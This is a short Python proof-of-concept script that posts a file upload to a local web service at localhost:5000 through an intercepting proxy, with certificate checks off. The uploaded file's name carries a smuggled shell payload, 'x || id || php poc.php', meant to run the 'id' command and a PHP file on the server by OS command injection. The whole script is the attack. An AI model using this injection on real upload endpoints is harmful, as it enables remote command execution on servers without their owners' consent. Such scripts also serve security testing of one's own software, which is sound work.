import requests

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

port = "5000"
url = f"http://localhost:{port}"

commands = "id"
payload = f"x || {commands} || php poc.php"

r = requests.post(url, files=[("file", (payload, "anything", "application/x-php"))], proxies=proxies, verify=False)

print(r.text)
